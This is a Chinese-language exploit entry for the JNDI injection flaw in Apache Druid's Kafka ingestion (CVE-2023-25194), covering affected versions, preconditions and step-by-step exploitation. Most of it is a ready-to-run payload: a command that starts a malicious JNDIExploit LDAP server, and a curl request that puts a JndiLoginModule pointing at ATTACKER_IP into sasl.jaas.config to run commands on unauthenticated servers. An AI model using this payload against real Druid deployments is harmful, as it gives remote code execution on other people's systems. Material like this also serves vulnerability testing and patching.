## 漏洞描述

Apache Druid 支持从 Kafka 加载数据，攻击者可通过修改 Kafka 连接配置中的 `sasl.jaas.config` 属性注入 JNDI lookup，利用 `com.sun.security.auth.module.JndiLoginModule` 发起 LDAP/RMI 请求，在服务端执行任意代码。该漏洞源于 Apache Kafka Connect 的 JNDI 注入问题（CVE-2023-25194）。

## 影响版本

- Apache Druid <= 25.0.0

## 前置条件

- 无需认证（Druid 默认无认证）
- 目标 Druid 端口可访问（默认8888）
- 攻击者需搭建恶意 LDAP/RMI 服务器

## 利用步骤

1. 在攻击机上启动恶意 LDAP/RMI 服务（如 JNDIExploit/marshalsec）
2. 向 `/druid/indexer/v1/sampler?for=connect` 发送 Kafka 类型请求
3. 在 `sasl.jaas.config` 中注入 JndiLoginModule 指向攻击者的 LDAP 服务
4. Druid 解析 Kafka 配置时触发 JNDI lookup，加载并执行恶意类

## Payload

### JNDI 注入（需先启动恶意 LDAP 服务）

```bash
# 攻击机启动 LDAP 服务
java -jar JNDIExploit.jar -i ATTACKER_IP -p 1389

# 发送 payload
curl -s -X POST "http://target:8888/druid/indexer/v1/sampler?for=connect" \
  -H "Content-Type: application/json" \
  -d '{
    "type": "kafka",
    "spec": {
      "type": "kafka",
      "ioConfig": {
        "type": "kafka",
        "consumerProperties": {
          "bootstrap.servers": "1.1.1.1:9092",
          "sasl.mechanism": "SCRAM-SHA-256",
          "security.protocol": "SASL_SSL",
          "sasl.jaas.config": "com.sun.security.auth.module.JndiLoginModule required user.provider.url=\"ldap://ATTACKER_IP:1389/Basic/Command/id\" useFirstPass=\"true\" serviceName=\"x\" debug=\"true\" group.provider.url=\"xxx\";"
        },
        "topic": "any",
        "useEarliestOffset": true,
        "inputFormat": {
          "type": "regex",
          "pattern": "([\\s\\S]*)",
          "listDelimiter": "56616469-6de2-9da4-efb8-8f416e6e6965",
          "columns": ["raw"]
        }
      },
      "dataSchema": {
        "dataSource": "sample",
        "timestampSpec": {
          "column": "!!!_no_such_column_!!!",
          "missingValue": "1970-01-01T00:00:00Z"
        },
        "dimensionsSpec": {},
        "granularitySpec": {"rollup": false}
      },
      "tuningConfig": {"type": "kafka"}
    },
    "samplerConfig": {
      "numRows": 500,
      "timeoutMs": 15000
    }
  }'
```
